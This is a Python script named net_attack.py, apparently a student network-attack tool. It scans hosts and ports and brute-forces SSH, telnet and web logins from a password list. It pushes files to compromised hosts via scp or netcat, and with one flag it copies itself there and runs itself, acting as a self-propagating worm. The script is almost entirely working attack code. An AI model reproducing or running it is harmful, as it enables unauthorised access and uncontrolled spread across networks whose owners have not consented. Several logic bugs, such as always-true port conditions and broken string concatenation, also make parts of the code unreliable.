#!/usr/bin/python3
# For use when adding new functionality with scapy, be sure to statically
# import when finished, wildcard is just for convenience.
# from scapy.all import *
from scapy.all import os, IP, TCP, sr, get_if_addr, get_if_list, subprocess
from time import sleep
import sys
import requests
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy
"""
Importing scappy for Packet Crafting and Sending / Sniffing.
Importing sleep for the scan port function to allow responses to be processed.
Importing sys to make OS calls and use OS level utilities.
Importing requests for web based operations.
Importing telnetlib for telnet operations.
Importing Paramiko for ssh operations.
"""

"""
===PLEASE READ===
Functions are organised alphabetically with the main function specified last.
Every function besides the main function has a block comment explaining what it
does, the main function itself has more specific, low level commenting.
"""


def additional_attacks(args, ip, port, bruteforced, transfer_file_filename,
                       service):
    """
    This function passes the appropriate arguments to and runs the transferring
    file and propagating functions, these functions contain the check to stop
    them from being ran if the appropriate arguments aren't used.
    """
    try_transferring_file(args, ip, port, bruteforced, transfer_file_filename,
                          service)
    try_propagating(args, ip, port, bruteforced, service)


def append_lines_from_file_to_list(file):
    """
    This function will read a file and return the lines (minus the newline
    character) as a list.
    """
    lines_list = []
    for line in file:
        lines_list.append(line.rstrip())
    return lines_list


def assigning_values(args):
    """
    This function will read in the target ports, target username and passwords
    filename from the user and if the user specified an ip addresses file it
    will read that and return it alongside all the other values.
    """
    if "-t" in args:
        ip_addresses_filename = args[args.index("-t")+1]
        try:
            ip_list = convert_file_to_list(ip_addresses_filename)
        except Exception:
            print("!!!ERROR: IP LIST CANNOT BE READ FROM FILENAME: "
                  + ip_addresses_filename + "!!!")
            gtfo_and_rtfm()
    target_ports = args[args.index("-p")+1]
    target_username = args[args.index("-u")+1]
    passwords_filename = args[args.index("-f")+1]
    return ip_list, target_ports, target_username, passwords_filename


def bruteforce_service(ip, port, username, password_list):
    """
    This function will run through every password in the password list and will
    attempt to bruteforce the appropriate service with that password. It will
    only move on to the next password in the event that the current password
    fails in its bruteforce attempt. If it succeeds then the successful login
    details are returned, if not then Null is returned.
    """
    for password in password_list:
        login_details = (try_password_for_service(
            ip, port, username, password))
        if login_details != "":
            return login_details
    return None


def check_telnet_data(string_to_check, data):
    """
    This function checks data gathered from the telnet service for a specific
    string and returns True if it finds it and false if it doesn't.
    """
    if data.__contains__(enc(string_to_check)):
        return True
    return False


def check_over_ssh(ip, port, username, password):
    """
    This function checks if the net_attack.py script is already located at the
    target machine over SSH. If it is then false is returned and if not then
    true is returned. This is needed as a prerequisite to propagating over SSH.
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        client.exec_command("touch net_attack.py")
        if str(client.exec_command("cat net_attack.py")[1]).__len__() < 1:
            client.close()
            return True
        client.close()
        return False

    except Exception:
        client.close()
        return True


def check_over_telnet(ip, port, username, password):
    """
    This function checks if the net_attack.py script is already located at the
    target machine over telnet. If it is then false is returned and if not then
    true is returned. This is needed as a prerequisite to propagating over
    telnet.
    """
    try:
        tel = Telnet(host=ip, port=port, timeout=2)
        tel.read_until(enc("login:"))
        tel.write(enc(str(username) + "\n"))
        tel.read_until(enc("Password:"))
        tel.write(enc(str(password) + "\n"))

        data = tel.read_until(enc("Welcome to"), timeout=4)
        if check_telnet_data("Welcome to", data):
            tel.write(enc("cat net_attack.py\n"))
            data = tel.read_until(enc("main()"), timeout=4)
            if data.__contains__(enc("main()")):
                return False
            return True
        return False

    except Exception:
        return False


def connect_ssh_client(ip, port, username, password):
    """
    This function checks to see if an SSH connection can be established and if
    so then it returns true, if not then it returns false.
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        client.close()
        connection_status("SSH", ip, port, username, password, "Successful")
        return True

    except Exception:
        client.close()
        connection_status("SSH", ip, port, username, password, "Unsuccessful")
        return False


def connect_telnet(ip, port, username, password):
    """
    This function checks to see if a telnet connection can be established and
    if so then it returns true, if not then it returns false.
    """
    try:
        tel = Telnet(host=ip, port=port, timeout=2)
        tel.read_until(enc("login:"))
        tel.write(enc(str(username) + "\n"))
        tel.read_until(enc("Password:"))
        tel.write(enc(str(password) + "\n"))

        data = tel.read_until(enc("Welcome to"), timeout=4)
        if check_telnet_data("Welcome to", data):
            connection_status("telnet", ip, port, username,
                              password, "Successful")
            return True
        connection_status("telnet", ip, port, username,
                          password, "Unsuccessful")
        return False

    except Exception:
        connection_status("telnet", ip, port, username,
                          password, "Unsuccessful")
        return False


def connect_web(ip, port, username, password):
    """
    This function check to see if a web login can be established and if so then
    it returns true, if not then it returns false.
    """
    attempt_succeeded = False
    try:
        send_post_request_with_login(ip, port, username, password)
        attempt_succeeded = True
    except Exception:
        connection_status("web", ip, port, username, password, "Unsuccessful")
    if attempt_succeeded:
        connection_status("web", ip, port, username, password, "Successful")
    return attempt_succeeded


def connection_status(service, ip, port, username, password, status):
    """
    This function will print and create the connection status string dependant
    on the context given by the arguments passed into it.
    """
    print(str(status) + " " + str(service) + " login to " + str(ip)
          + ":" + str(port) + " using " + str(username) + ":" + str(password))


def convert_file_to_list(filename):
    """
    This function will convert a given file specified by a filename to a list
    and will then proceed to return that list.
    """
    with open(str(filename)) as file:
        file_as_list = append_lines_from_file_to_list(file)
    return file_as_list


def cycle_through_subnet(ip_list, interface):
    """
    This function takes in a given network interface and an IP list, it will
    get the IP address of the interface and add all the address from its /24
    subnet to the IP list and will then return the list.
    """
    interface_split = get_if_addr(interface).split(".")
    last_byte = 0
    while last_byte < 256:
        specific_address = str(interface_split[0]) + "."
        + str(interface_split[1]) + "." + str(interface_split[2]) + "."
        + str(last_byte)
        if not ip_list.__contains__(specific_address):
            print("Adding " + str(specific_address)
                  + " from interface " + str(interface) + "'s subnet.")
            ip_list.append(specific_address)
        last_byte = last_byte + 1
    return ip_list


def enc(s):
    """
    This function will encode a string in ascii.
    """
    return s.encode("ascii")


def file_error_handler(filename):
    """
    This function handles errors related to the processing of files.
    """
    print("!!!ERROR: SOMETHING WENT WRONG WHEN PROCESSING THE FILENAME: "
          + filename + "!!!")
    gtfo_and_rtfm()


def file_not_exist(ip, port, username, password):
    """
    This function will check whether or not network_attack.py exists on a
    target machine and how it does that is dependant on the port being passed
    in.
    """
    if str(port) == "22":
        return check_over_ssh(ip, port, username, password)

    return check_over_telnet(ip, port, username, password)


def gathering_local_ips(ip_list):
    """
    This function will cycle through all local interfaces outside of the
    loopback interface and will add their /24 subnets to the IP list.
    """
    print("Fetching local interface list...")
    local_interfaces = get_if_list()
    for interface in local_interfaces:
        if str(interface) != "lo":
            (print("Fetching IPs for interface " + str(interface) + "..."))
            ip_list.extend(cycle_through_subnet(ip_list, interface))
    return ip_list


def gtfo_and_rtfm():
    """
    This function will print the help screen, show an exit prompt, and
    gracefully exit the script... If you call telling the user to gtfo and rtfm
    without them realising it graceful...
    """
    pls_help()
    print("Exiting...")
    exit()


def is_reachable_ip(ip):
    """
    This function checks to see if an IP is reachable and returns true if it is
    and false if it isn't. The commented out code is the scappy way of doing it
    and the uncommented code uses OS calls. In my testing OS calls were faster
    but both approaches work.
    """
    # ping_pkt = IP(dst=str(ip))/ICMP()
    # reply = sr(ping_pkt, timeout=1)[0]
    # if not reply:
    #     print(str(ip) + " was not reachable.")
    #     return False
    # print(ip + " was reachable.")
    # return True
    command = ["ping", "-c", "1", str(ip)]
    if subprocess.call(command) == 0:
        print(ip + " was reachable.")
        return True
    print(str(ip) + " was not reachable.")
    return False


def pls_help():
    """
    This function prints the help screen for the end user.
    """
    print("Parameters:")
    print("\t-t -> Filename for a file containing a list of target IP"
          + " addresses")
    print("\t-p -> Ports to scan on the target host")
    print("\t-u -> A username")
    print("\t-f -> Filename for a file containing a list of passwords")
    print("\t-L -> Scans the lan across all interfaces and creates/adds to the"
          + " list of target IP addresses")
    print("\t-P -> Propagates the script onto available devices and executes"
          + " the script using the given command")

    print("Example usage:")
    print("\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f"
          + " my_password_list.txt")
    print("\t./net_attack.py -t ip_list.txt -p 22 -u root -f passwords.txt")


def propagate_script(ip, port, login_string):
    """
    This function is responsible for propagating the network_attack.py to a
    previously bruteforced machine. It will only run when the user specifies
    using the appropriate argument and when the port being bruteforced is
    either 22 (SSH) and 23 (telnet), it will also check to ensure the script
    isn't  already present on the target. It goes about propagating the script
    in different ways depending on if an SSH port or a telnet port is
    specified.
    """
    login_string_split = login_string.split(":")
    try:
        if file_not_exist(ip, port, login_string_split[0],
                          login_string_split[1]):
            if str(port) == "22":
                print("Please type in this password below and say yes to any "
                      + " RSA key prompts: ")
                os.system("scp -P " + str(port) + " net_attack.py "
                          + login_string_split[0] + "@" + ip + ":~/")
                print("Please type in this password again: ")
                os.system("scp -P " + str(port) + " passwords.txt "
                          + login_string_split[0] + "@" + ip + ":~/")
                client = SSHClient()
                try:
                    client.set_missing_host_key_policy(AutoAddPolicy())
                    client.connect(hostname=str(ip), port=int(port),
                                   username=str(login_string_split[0]),
                                   password=str(login_string_split[1]))
                    client.exec_command("net_attack.py -L -p 22,23 -u "
                                        + login_string_split[0] + " -f"
                                        + " passwords.txt -P")
                    client.close()
                    return True

                except Exception:
                    client.close()
                    return False
                return True
            tel = Telnet(host=ip, port=port, timeout=2)
            tel.read_until(enc("login:"))
            tel.write(enc(str(login_string_split[0]) + "\n"))
            tel.read_until(enc("Password:"))
            tel.write(enc(str(login_string_split[1]) + "\n"))
            tel.write(enc("nc -l -p " + str(port) + " > net_attack.py"))
            os.system(enc("nc -w 3 " + str(ip) + " " + str(port)
                          + " < net_attack.py"))
            tel.write(enc("nc -l -p " + str(port) + " > passwords.txt"))
            os.system(enc("nc -w 3 " + str(ip) + " " + str(port)
                          + " < passwords.txt"))
            tel.write(enc("net_attack.py -L -p 22,23 -u "
                      + login_string_split[0] + " -f passwords.txt -P"))
            return True
        else:
            print("net_attack.py is already on host: " + str(ip))
            return False
    except Exception:
        return False


def remove_unreachable_ips(ip_list):
    """
    This function will try and ping every IP in the IP list and if it doesn't
    receive a response it will then remove that IP from the IP list.
    """
    new_ip_list = []
    for ip in ip_list:
        print("Checking if the following ip address is reachable: " + str(ip))
        if is_reachable_ip(ip):
            new_ip_list.append(ip)
    return new_ip_list


def scan_port(ip, port):
    """
    This function will scan a port to see if it is open. If the port is open
    then it will return true and if it is not then it will return false.
    """
    ip_hdr = IP(dst=ip)
    tcp_hdr = TCP(dport=int(port), flags="S")
    pkt = ip_hdr/tcp_hdr
    resp, unans = sr(pkt, timeout=2)
    sleep(2)
    if len(resp) > 0:
        return True
    return False


def send_post_request_with_login(ip, port, username, password):
    """
    This function sends a post request to a web server in an attempt to
    bruteforce its login details. If it succeeds with the given arguments then
    it will return the successful string of details, if not then it will return
    Null.
    """
    response = requests.post("https://"+ip+":"+port+"/login.php",
                             data={"username": username, "password": password},
                             timeout=4)
    if response:
        connection_status("web", ip, port, username, password, "Successful")
        return str(username)+":"+str(password)
    else:
        connection_status("web", ip, port, username, password, "Unsuccessful")
        return None


def telnet_connection(ip_telnet, port_telnet, username_telnet,
                      password_telnet):
    """
    This function will try to establish a telnet connection, if it does it will
    return the successful telnet login string and if not then it will return a
    null value.
    """
    if connect_telnet(ip_telnet, port_telnet, username_telnet,
                      password_telnet):
        return str(username_telnet)+":"+str(password_telnet)
    return None


def transfer_file(ip, port, login_string, transfer_file_filename):
    """
    This function will transfer a given file if the end user has provided the
    appropriate argument, and only when bruteforce login details are found for
    either tenet or SSH. It handles the transfer of this file differently
    depending on whether or not the port value given is an SSH port or a telnet
    port.
    """
    login_string_split = login_string.split(":")
    try:
        if str(port) == "22":
            print(
                "Please type in this password below and say yes to any RSA key"
                + " prompts: ")
            os.system("scp -P " + str(port) + " " + transfer_file_filename
                      + " " + login_string_split[0] + "@" + ip + ":~/")
            return True

        tel = Telnet(host=ip, port=port, timeout=2)
        tel.read_until(enc("login:"))
        tel.write(enc(str(login_string_split[0]) + "\n"))
        tel.read_until(enc("Password:"))
        tel.write(enc(str(login_string_split[1]) + "\n"))
        tel.write(enc("nc -l -p " + str(port) + " > "
                  + str(transfer_file_filename) + "\n"))
        os.system(enc("nc -w 3 " + str(ip) + " " + str(port)
                  + " < " + str(transfer_file_filename) + "\n"))
        return True
    except Exception:
        return False


def try_attack(ip, port, target_username, password_list,
               transfer_file_filename, args):
    """
    This function will attempt a bruteforce attack across various services
    depending on the ip or port supplied (if the port is open on that IP), it
    iterates through the password list when bruteforcing the appropriate
    service associated with the port number supplied. If the bruteforce attack
    is successful it will then check the need for additional attacks specified
    by the end user.
    """
    ip_address_and_port = str(ip)+":"+str(port)
    print("Now testing the following address: " + ip_address_and_port + "...")
    if scan_port(ip, port):
        print(ip_address_and_port + " is open.")
        bruteforced = try_bruteforcing(
            ip, port, target_username, password_list, ip_address_and_port)
        if(bruteforced[0]):
            additional_attacks(
                args, ip, port, bruteforced[0], transfer_file_filename,
                bruteforced[1])
    else:
        print(ip_address_and_port + " is closed.")


def try_bruteforcing(ip, port, target_username, password_list,
                     ip_address_and_port):
    """
    This function will try bruteforcing a specific service depending on the
    port supplied. If it gets a successful login then it will return the login
    details and the service used, otherwise it returns null as the login
    details along with the service used.
    """
    service_switch = {
        "22": "ssh",
        "23": "telnet",
        "80": "web login",
        "8080": "web login",
        "8888": "web login"
    }
    service = service_switch.get(str(port))
    bruteforced = bruteforce_service(ip, port, target_username, password_list)
    if bruteforced:
        print("A working username and password for "
              + str(service) + " was found: " + str(bruteforced))
        return str(bruteforced), service
    else:
        print("It was impossible to bruteforce: "
              + ip_address_and_port + ", that's rough buddy. :(")
    return None, service


def try_password_for_service(ip, port, username, password):
    """
    This function trys to login to a port's associated service using a specific
    username and password pair. If it succeeds it returns the successful login
    string, otherwise it returns an empty string.
    """
    try:
        connect_service_switch = {
            "22": lambda: connect_ssh_client(ip, port, username, password),
            "23": lambda: connect_telnet(ip, port, username, password),
            "80": lambda: connect_web(ip, port, username, password),
            "8080": lambda: connect_web(ip, port, username, password),
            "8888": lambda: connect_web(ip, port, username, password)
        }
        connect_service = connect_service_switch.get(str(port))
        if connect_service():
            return str(username)+":"+str(password)
        return ""

    except Exception:
        return ""


def try_propagating(args, ip, port, bruteforced, service):
    """
    This function attempts propagation of the network_attack.py script over the
    network. If it succeed we alert the user and let them know what service was
    successful. If it is unsuccessful then we let the user know it was
    unsuccessful and over what service. Should the user have never asked for
    the script to be propagated over the network then we let them know this
    part of the process will not be done.
    """
    if "-P" in args and (port == "22" or "23"):
        propagated = propagate_script(ip, port, bruteforced)
        if propagated:
            print("Script propagated over " + service + ".")
        else:
            print("Script couldn't be propagated over " + service + ".")
    else:
        print("Requirement to propagate script not specified, skipping...")


def try_transferring_file(args, ip, port, bruteforced, transfer_file_filename,
                          service):
    """
    This function attempts transferring a user specified file across the
    network. If it succeeds we alert the user and let them know transferring
    the file was a success and over what service. If it is unsuccessful then we
    let the user know it was unsuccessful and over what service. Should the
    user have never asked for a file to be transferred over the network then we
    let them know this process will not be done.
    """
    if "-d" in args and (str(port) == "22" or "23"):
        transferred = transfer_file(
            ip, port, bruteforced, transfer_file_filename)
        if transferred:
            print("File " + str(transfer_file_filename)
                  + " transferred over " + service + ".")
        else:
            print("File " + str(transfer_file_filename)
                  + " couldn't be transferred over " + service + ".")
    else:
        print("Requirement to transfer file not specified, skipping...")


def validate_file_exists(filename):
    """
    This function checks if a file exists given a set filename and if it
    doesn't we alert the user with an error and put them in the bold corner.
    Just kidding we show the help screen and exit gracefully.
    """
    if not os.path.isfile(filename):
        print("!!!ERROR: THE FOLLOWING FILE DOES NOT EXIST: " + filename
              + "!!!")
        gtfo_and_rtfm()


def main():
    """
    This main function controls all the things.
    """
    # These arguments are passed in by the end user.
    args = sys.argv
    # Blank target ports until we assign them later, they're here purely for
    # scope related reasons.
    target_ports = []
    # Same here....
    target_username = ""
    # And here...
    passwords_filename = ""
    # Here...
    transfer_file_filename = ""
    # *yawn*
    ip_list = []
    # Right, done...
    password_list = []

    # The following if statement only runs if the user uses the script
    # correctly or they don't ask for help.
    if (("-t" or "-L" in args) and "-p" and "-u" and "-f" in args
            and len(args) >= 8 and "-h" and "--help" not in args):
        try:
            # Here I'm fetching the values needed for the blank variables
            # above.
            values = assigning_values(args)
            # Then assigning these values to their associated variables which
            # are most of the blank ones above.
            ip_list = values[0]
            target_ports = values[1]
            target_username = values[2]
            passwords_filename = values[3]

        except Exception:
            # Some sillyness happened when it came to fetching / assigning
            # values, mostly triggered by null entries.
            print("!!!ERROR: FAILED ASSIGNING VALUES (MAYBE NULL)!!!")
            # Teach the user how to use this spaghetti code.
            gtfo_and_rtfm()
    else:
        # Probably a typo, either way showing the help again.
        print("!!!ERROR: PARAMETER MISUSE, CHECK HELP TEXT BELOW!!!")
        gtfo_and_rtfm()

    # The end user specified a local scan must be executed, the result of the
    # local scan will extend the current ip_list.
    if "-L" in args:
        print("Performing local scan, this might take a while so grab a"
              + " coffee...")
        ip_list.extend(gathering_local_ips(ip_list))

    try:
        # Here I made sure the user actually gave a valid file for the
        # passwords list. If they have...
        validate_file_exists(passwords_filename)
        # A list of passwords is created.
        password_list = convert_file_to_list(passwords_filename)
    except Exception:
        # Uh oh, file doesn't exist, alert the user and exit gracefully so they
        # can either fix their mistake or repent their sins.
        file_error_handler(passwords_filename)

    # If the user wants to transfer a file, this stuff should be done...
    if "-d" in args:
        try:
            # Again making sure the transfer file actually exits, just like the
            # password file above.
            validate_file_exists(transfer_file_filename)
            # if it does though we assign the filename to the name out of scope
            # above.
            transfer_file_filename = args[args.index("-d")+1]
        except Exception:
            # File doesn't exist, throw an error and give the usual slap across
            # the wrist.
            file_error_handler(transfer_file_filename)
    # Removing duplicate entries in the IP address list, can come from
    # combining local scan with given IP addresses in an ip address file among
    # other things and silliness.
    ip_list = list(dict.fromkeys(ip_list))
    # Removing IPs from the IP list that can't be pinged from the host machine
    # of the script.
    ip_list = remove_unreachable_ips(ip_list)
    # Getting a list of ports by splitting the target ports specified by the
    # user on the comma.
    ports = target_ports.split(",")
    # Cycling through every IP in the IP list...
    for ip in ip_list:
        # And then using all user specified ports against that specific IP...
        for port in ports:
            # Try to attack >:)
            try_attack(ip, port, target_username, password_list,
                       transfer_file_filename, args)


main()
